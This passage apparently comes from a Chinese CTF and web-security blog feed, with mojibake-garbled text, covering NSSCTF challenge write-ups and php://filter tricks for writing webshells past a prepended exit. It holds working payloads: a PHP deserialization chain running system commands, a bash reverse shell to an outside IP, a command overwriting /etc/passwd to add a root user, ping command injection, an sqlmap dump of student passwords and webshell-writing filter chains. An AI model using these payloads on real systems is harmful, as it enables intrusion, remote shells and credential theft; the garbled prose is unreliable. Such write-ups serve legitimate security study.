payloadï¼š</p><p>postï¼šfast&#x3D;a:2:{i:0;O:5:â€Startâ€:1:{s:6:â€errMsgâ€;O:6:â€Cryptoâ€:1:{s:3:â€objâ€;O:7:â€Reverseâ€:1:{s:4:â€funcâ€;O:3:â€Pwnâ€:1:{s:3:â€objâ€;O:3:â€Webâ€:2:{s:4:â€funcâ€;s:6:â€systemâ€;s:3:â€varâ€;s:7:â€cat &#x2F;f*â€;}}}}}i:0;i:0;} </p><p><img src="/2023/10/25/new%20starweek%204/image/image-20231025100216201-1700990426090-222-1700994600468-196.png" alt="image-20231025100216201"></p><p>æ‹¿åˆ°flag</p><p>flag{558eb633-8715-4922-8201-f8402343b140} </p><p>å½“ç„¶è¿™é‡Œä¿é™©ä¸€ç‚¹çš„åšæ³•æ˜¯å…ˆæ‰§è¡Œ ls å‘½ä»¤ï¼Œç„¶åå†ä½¿ç”¨ ..&#x2F;..&#x2F;..&#x2F; è¿›è¡Œç›®å½•ç©¿è¶Š ï¼Œæ‰¾åˆ°flagæ‰€åœ¨ç›®å½•ï¼Œå†è¿›è¡Œ catï¼Œå¹¶ä¸”è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­— flagï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨é€šé…ç¬¦ * è¿›è¡ŒåŒ¹é…ã€‚</p><p>bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;123.57.236.154&#x2F;9999 0&gt;&amp;1&quot;</p><p>åªæ˜¯è¯´ä¸€èˆ¬ flag éƒ½åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥ cat &#x2F;f*ã€‚</p><p>echo â€˜d3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgphYmM6JDEkMSoyKjMkR0RYZWNvOXVhR0IuUTBpMHdzRkNBMTowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g&#x3D;â€™ | base64 -d &gt; &#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger -o rw,remount</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger-o ro,remount</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
      <url>/2023/10/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="å°è¿ªå®‰å…¨çŸ¥è¯†ç§¯ç´¯"><a href="#å°è¿ªå®‰å…¨çŸ¥è¯†ç§¯ç´¯" class="headerlink" title="å°è¿ªå®‰å…¨çŸ¥è¯†ç§¯ç´¯"></a>å°è¿ªå®‰å…¨çŸ¥è¯†ç§¯ç´¯</h1><p> phpæºç é‡Œé¢æœ‰ä¹±ç ï¼Œå¼€å¤´æ˜¯zend,å»æœphpè§£å¯†<a href="https://www.toolnb.com/tools/phpcarbylamine.html">https://www.toolnb.com/tools/phpcarbylamine.html</a></p><p>.netæ–‡ä»¶åç¼–è¯‘</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023å¹´SWPU NSS ç§‹å­£æ‹›æ–°èµ› (æ ¡å¤–èµ›é“)</title>
      <link href="/2023/10/19/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20(%E6%A0%A1%E5%A4%96%E8%B5%9B%E9%81%93)/"/>
      <url>/2023/10/19/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20(%E6%A0%A1%E5%A4%96%E8%B5%9B%E9%81%93)/</url>
      
        <content type="html"><![CDATA[<h1 id="2023å¹´SWPU-NSS-ç§‹å­£æ‹›æ–°èµ›-æ ¡å¤–èµ›é“"><a href="#2023å¹´SWPU-NSS-ç§‹å­£æ‹›æ–°èµ›-æ ¡å¤–èµ›é“" class="headerlink" title="2023å¹´SWPU NSS ç§‹å­£æ‹›æ–°èµ› (æ ¡å¤–èµ›é“)"></a>2023å¹´SWPU NSS ç§‹å­£æ‹›æ–°èµ› (æ ¡å¤–èµ›é“)</h1><h2 id="ä¸€é”®è¿æ¥"><a href="#ä¸€é”®è¿æ¥" class="headerlink" title="ä¸€é”®è¿æ¥!"></a>ä¸€é”®è¿æ¥!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$md5_1 = $_GET[&#x27;md5_1&#x27;];</span><br><span class="line">$md5_2 = $_GET[&#x27;md5_2&#x27;];</span><br><span class="line">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];</span><br><span class="line">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];</span><br><span class="line">$new_player =$_GET[&#x27;new_player&#x27;];</span><br><span class="line">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;</span><br><span class="line">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;</span><br><span class="line">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;</span><br><span class="line">            echo &quot;Congratulations~~~~~~~~~&quot;;</span><br><span class="line">            echo &quot;è¯•è¯•need Antsword&lt;br/&gt;&quot;;</span><br><span class="line">            @eval($_POST[&#x27;Nss&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;å¯æ›¾å¬è¿‡dataåè®®?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;sha1åˆå¦‚ä½•ç›¸ç­‰å‘¢&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;å¦‚ä½•è®©md5å€¼ç›¸ç­‰å‘¢Â¿&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>?md5_1[]&#x3D;QNKCDZO&amp;md5_2[]&#x3D;s155964671a&amp;sha1_1[]&#x3D;aaroZmOk&amp;sha1_2[]&#x3D;aaK1STfY&amp;new_player&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Welcome to NSSCTF!!!</p><p>Nss&#x3D;system(â€œcat &#x2F;flagâ€);</p><h2 id="NSS-HTTP-CHEKER"><a href="#NSS-HTTP-CHEKER" class="headerlink" title="NSS_HTTP_CHEKER"></a>NSS_HTTP_CHEKER</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?this_is_get=get_%1t HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:28397</span><br><span class="line">User-Agent: NSSCTF</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:28397</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:28397/</span><br><span class="line">Cookie: PHPSESSID=1b41efa492475836bbc4873098999ab3;this_is_cookie=cookie_suki_desu~</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">this_is_post=p03t</span><br></pre></td></tr></table></figure><h2 id="Pingpingping"><a href="#Pingpingping" class="headerlink" title="Pingpingping"></a>Pingpingping</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$_ping = $_GET[&#x27;Ping_ip.exe&#x27;];</span><br><span class="line">if(isset($_ping))&#123;</span><br><span class="line">    system(&quot;ping -c 3 &quot;.$_ping);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $data = base64_encode(file_get_contents(&quot;error.png&quot;));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="http://node6.anna.nssctf.cn:28422/?Ping%5Bip.exe=127.0.0.1;cat">http://node6.anna.nssctf.cn:28422/?Ping[ip.exe=127.0.0.1;cat</a> &#x2F;flag</p><h2 id="UnS3rialize"><a href="#UnS3rialize" class="headerlink" title="UnS3rialize"></a>UnS3rialize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NSS</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd=&quot;cat /f*&quot;;</span><br><span class="line">    function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;W4keup!!!&lt;br/&gt;&quot;;</span><br><span class="line">        $this-&gt;cmd = &quot;echo Welcome to NSSCTF&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $whoami;</span><br><span class="line">    function __get($argv)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;what do you want?&quot;;</span><br><span class="line">        $want = $this-&gt;whoami;</span><br><span class="line">        return $want();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T</span><br><span class="line">&#123;</span><br><span class="line">    public $sth;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;;</span><br><span class="line">        return $this-&gt;sth-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F</span><br><span class="line">&#123;</span><br><span class="line">    public $user = &quot;SWPU&quot;;</span><br><span class="line">    public $passwd = &quot;NSS&quot;;</span><br><span class="line">    public $notes;</span><br><span class="line">//    function __construct($user, $passwd)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;user = $user;</span><br><span class="line">//        $this-&gt;passwd = $passwd;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;user === &quot;SWPU&quot; &amp;&amp; $this-&gt;passwd === &quot;NSS&quot;) &#123;</span><br><span class="line">            echo &quot;Now you know how to use __construct&lt;br/&gt;&quot;;</span><br><span class="line">            echo &quot;your notes&quot;.$this-&gt;notes;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;N0!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new F();</span><br><span class="line">$a-&gt;notes=new T();</span><br><span class="line">$a-&gt;notes-&gt;sth=new C();</span><br><span class="line">$a-&gt;notes-&gt;sth-&gt;whoami=new NSS();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure><blockquote><p>O:1:â€Fâ€:3:{s:4:â€userâ€;s:4:â€SWPUâ€;s:6:â€passwdâ€;s:3:â€NSSâ€;s:5:â€notesâ€;O:1:â€Tâ€:1:{s:3:â€sthâ€;O:1:â€Câ€:1:{s:6:â€whoamiâ€;O:3:â€NSSâ€:1:{s:3:â€cmdâ€;s:7:â€cat &#x2F;f*â€;}}}}</p></blockquote><p>base64ç¼–ç ä¼ ä¸Šå»å³å¯</p><p>python sqlmap.py -r 1.txt -D school -T students -C name,student_id,grade,password -dump -batch</p><p>åœ¨è¡¨æ ¼é‡Œå¯ä»¥çœ‹åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File_put_contentsåˆ©ç”¨æŠ€å·§(php://filteråè®®ï¼‰</title>
      <link href="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/"/>
      <url>/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="file-put-contentsåˆ©ç”¨æŠ€å·§-php-filteråè®®ï¼‰"><a href="#file-put-contentsåˆ©ç”¨æŠ€å·§-php-filteråè®®ï¼‰" class="headerlink" title="file_put_contentsåˆ©ç”¨æŠ€å·§(php:&#x2F;&#x2F;filteråè®®ï¼‰"></a>file_put_contentsåˆ©ç”¨æŠ€å·§(php:&#x2F;&#x2F;filteråè®®ï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure><p><code>$content</code>åœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¿™é‡Œçš„<code>$_POST[&#39;filename&#39;]</code>æ˜¯å¯ä»¥æ§åˆ¶åè®®çš„ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨ php:&#x2F;&#x2F;filteråè®®æ¥æ–½å±•é­”æ³•ã€‚</p><p><strong>#æ–¹æ³•ä¸€ã€base64ç¼–ç </strong></p><p>ä½¿ç”¨php:&#x2F;&#x2F;filteræµçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤â€œæ­»äº¡exitâ€ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œbase64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ˆA-Z a-z 0-9 + &#x2F;ï¼‰â€™&#x3D;â€™è¡¥ä½ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p><p>æ‰€ä»¥ï¼Œå½“<code>$content</code>è¢«åŠ ä¸Šäº†<code>&lt;?php exit; ?&gt;</code>ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode  æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚</p><p>â€œphpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œ<strong>å› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„</strong>ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯<code>&lt;?php exit; ?&gt;</code>æ²¡æœ‰äº†ã€‚</p><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406235335043-1930261389-1700990340346-129-1700994531544-103.png"></a></p><p><strong>#æ–¹æ³•äºŒã€åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•+base64ç»„åˆæ‹³</strong></p><p>é™¤äº†ä½¿ç”¨base64ç‰¹æ€§çš„æ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨php:&#x2F;&#x2F;filterå­—ç¬¦ä¸²å¤„ç†æ–¹æ³•æ¥å»é™¤â€œæ­»äº¡exitâ€ã€‚æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ï¼Œè¿™ä¸ª<code>&lt;?php exit; ?&gt;</code>å®é™…ä¸Šæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp:&#x2F;&#x2F;filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚</p><p>ç¼–å†™å¦‚ä¸‹æµ‹è¯•ä»£ç å³å¯æŸ¥çœ‹ php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input çš„æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;);</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406234627327-1601681134-1700990340346-130-1700994531544-104.png"></a></p><p>å¯è§ï¼Œ<code>&lt;?php exit; ?&gt;</code>è¢«å»é™¤äº†ã€‚ä½†å›åˆ°ä¸Šé¢çš„é¢˜ç›®ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯å†™å…¥ä¸€ä¸ªwebshellï¼Œè€Œå†™å…¥çš„webshellä¹Ÿæ˜¯phpä»£ç ï¼Œå¦‚æœä½¿ç”¨strip_tagsåŒæ ·ä¼šè¢«å»é™¤ã€‚</p><p>ä¸‡å¹¸çš„æ˜¯ï¼Œphp:&#x2F;&#x2F;filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåå†è¿›è¡Œbase64-decodeã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«å»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŸã€‚</p><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234831984-1876664653.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406234831984-1876664653-1700990340346-131-1700994531544-105.png"></a></p><p><strong>#æ–¹æ³•ä¸‰ã€ROT13ç¼–ç </strong></p><p>åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ï¼š</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407000202377-1581427195.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407000202377-1581427195-1700990340346-132-1700994531544-106.png"></a></p><p> <strong>Round 2</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($a,&quot;&lt;?php exit();&quot;.$a);</span><br></pre></td></tr></table></figure><p>è¿™ç§æ˜¯å‰åä¸¤ä¸ªå˜é‡ç›¸åŒï¼Œå‡è®¾$aå¯æ§æƒ…å†µã€‚</p><p>è¿™ç§ç›¸åŒå˜é‡çš„æ„é€ æ–¹å¼å’Œä¸åŒå˜é‡çš„æ„é€ æ–¹å¼æ€è·¯æ˜¯å¤§å·®ä¸å·®çš„ï¼Œéƒ½æ˜¯éœ€è¦å¹²æ‰<code>&lt;?php exit();</code>ï¼Œåªä¸è¿‡æ„é€ èµ·æ¥ç›¸å¯¹æ›´å¤æ‚ä¸€äº›ã€‚</p><p><strong>#æ–¹æ³•ä¸€ã€base64ç¼–ç </strong></p><p>æ ¹æ®å‰é¢ä»‹ç»çš„ä¸åŒå˜é‡çš„æ„é€ æ–¹æ³•ï¼Œå¾ˆå®¹æ˜“æ‹“å±•åˆ°ç›¸åŒçš„å˜é‡ï¼ŒåŒæ ·åˆ©ç”¨php:&#x2F;&#x2F;filteræ¥æ„é€ ï¼Œåæ­£åé¢æ˜¯å†™å…¥çš„å†…å®¹ï¼Œåªè¦åœ¨åé¢è§£ç çš„æ—¶å€™æŠŠshellè§£ç å‡ºæ¥ï¼Œä¸éœ€è¦çš„ä¸œè¥¿è§£ç æˆä¹±ç å³å¯ï¼Œè€ŒBase64æ„é€ çš„è¯ï¼Œä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</span><br><span class="line"></span><br><span class="line">ï¼ˆ    &lt;?php phpinfo();?&gt;    base64ç¼–ç     PD9waHAgcGhwaW5mbygpOz8+      ï¼‰</span><br></pre></td></tr></table></figure><p>æ„é€ çš„shellå¯ä»¥æ”¾åœ¨è¿‡æ»¤å™¨çš„ä½ç½®å’Œæ–‡ä»¶åä½ç½®éƒ½å¯ä»¥ï¼ˆå…¶ä»–ç¼–ç æœ‰æ—¶å€™ä¼šæœ‰ç©ºæ ¼ä»€ä¹ˆçš„ä¹±ç ï¼Œæ–‡ä»¶åä¸ä¸€å®šå¥½ç”¨ï¼‰ï¼Œphp:&#x2F;&#x2F;filteré¢å¯¹ä¸å¯ç”¨çš„è§„åˆ™ï¼ˆä¸€ä¸²base64ï¼‰æ˜¯æŠ¥ä¸ªWarningï¼Œç»•åè·³è¿‡ç»§ç»­æ‰§è¡Œçš„ï¼ˆä¸ä¼šé€€å‡ºï¼‰ï¼Œæ‰€ä»¥æŒ‰ç†è¯´è¿™æ ·æ„é€ æ˜¯â€œå¾ˆå®Œç¾â€çš„ã€‚æˆ‘ä»¬çœ‹ä¸‹base-decodeå“ªäº›å­—ç¬¦ğŸ‘‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shellphp</span><br></pre></td></tr></table></figure><p>è€Œé»˜è®¤æƒ…å†µä¸‹base64ç¼–ç æ˜¯ä»¥ &#x3D; ä½œä¸ºç»“å°¾çš„ï¼Œæ‰€ä»¥æ­£å¸¸è§£ç çš„æ—¶å€™åˆ°äº† &#x3D; å°±è§£ç ç»“æŸäº†ï¼Œå³ä½¿æˆ‘ä»¬æ„é€ payloadçš„æ—¶å€™ä¸ç”¨<code>write=</code>ï¼Œä½†æ˜¯åœ¨æœ€åè·å–æ–‡ä»¶åçš„æ—¶å€™<code>resource=</code>ä¸­çš„ &#x3D; è¿‡ä¸æ‰ï¼Œæ‰€ä»¥å¯¼è‡´è¿‡æ»¤å™¨è§£ç å¤±è´¥ï¼Œä»è€ŒæŠ¥é”™â€¦</p><p>è¿™é‡Œç”¨base64ç¼–ç æˆ‘è¿˜æ²¡æ‰¾åˆ°å¥½çš„æ–¹æ³•ï¼Œå¾…è¡¥å……â€¦</p><p><strong>#æ–¹æ³•äºŒã€ROT13</strong></p><p>rot13ç¼–ç å°±ä¸å­˜åœ¨base64çš„é—®é¢˜ï¼Œæ‰€ä»¥å’Œå‰é¢base64æ„é€ çš„æ€è·¯ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103428847-745843372.png"><img 